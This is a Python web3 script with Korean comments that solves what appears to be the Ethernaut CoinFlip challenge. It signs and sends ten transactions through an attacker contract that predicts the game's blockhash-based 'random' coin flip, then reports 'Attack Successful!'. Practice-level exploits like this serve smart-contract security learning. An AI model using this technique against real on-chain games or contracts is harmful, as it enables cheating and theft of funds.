from web3 import Web3
import time

# 풀이
# 1. CoinFlip 컨트랙트를 외부에서 동일한 Random Seed 번호를 이용하여 호출하는 컨트랙트 생성
# 2. 생성한 컨트랙트로 네트워크의 동일한 블록 번호를 활용한 데이터를 CoinFlip 컨트랙트의 flip 함수에 전달
# 3. 전달한 데이터로 동전 앞/뒤 정보를 전달하여 10회 검사 통과하기 

# 문제에서 사용하는 각종 정보 추출
def parse_env_to_dict(env_file_path):
    env_dict = {}

    # Read the .env file line by line
    with open(env_file_path, "r") as file:
        for line in file:
            # Strip whitespace and ignore comments or empty lines
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Split key and value on the first '='
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            # Remove quotes from the value if present
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]

            # Add to dictionary
            env_dict[key] = value

    return env_dict

ENV_PATH = "../.env"

dict_output = parse_env_to_dict(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x8dAF17A20c9DBA35f005b6324F493785D239719d'
ATTACKER_ADDRESS = '0x8464135c8F25Da09e49BC8782676a84730C318bC'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "consecutiveWins",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xe6f334d7"
    },
    {
        "type": "function",
        "name": "flip",
        "inputs": [
            {
                "name": "_guess",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "signature": "0x1d263f67"
    }
]

ATTACKER_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract CoinFlip",
        "name": "_coinflipContract",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "consecutiveWins",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "flip",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

TOTAL_WINS = contract.functions.consecutiveWins().call()

print(f"Current Total Wins : {TOTAL_WINS}\n")

for _ in range(10):
  BASE_FEE = web3.eth.get_block('pending')['baseFeePerGas']
  PRIORITY_FEE = int(BASE_FEE * 0.15 // 1)
  CURRENT_NONCE = web3.eth.get_transaction_count(USER_ADDRESS)

  # flip 함수 호출하여 동전 면 맞추기
  data = {
      'from': USER_ADDRESS,
      'value': 0,
      'gas': web3.to_wei("0.000000000001", 'ether'),
      'maxPriorityFeePerGas': PRIORITY_FEE,
      'maxFeePerGas': BASE_FEE + PRIORITY_FEE,
      'nonce': CURRENT_NONCE,
  }

  # 트랜젝션 서명 및 전송
  tx = attacker.functions.flip().build_transaction(data)
  signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
  tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

  # 트랜잭션 결과 확인
  tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
  
  TOTAL_WINS = contract.functions.consecutiveWins().call()
  print(f"Current Total Wins: {TOTAL_WINS}")

if TOTAL_WINS >= 10:
    print("Attack Successful!")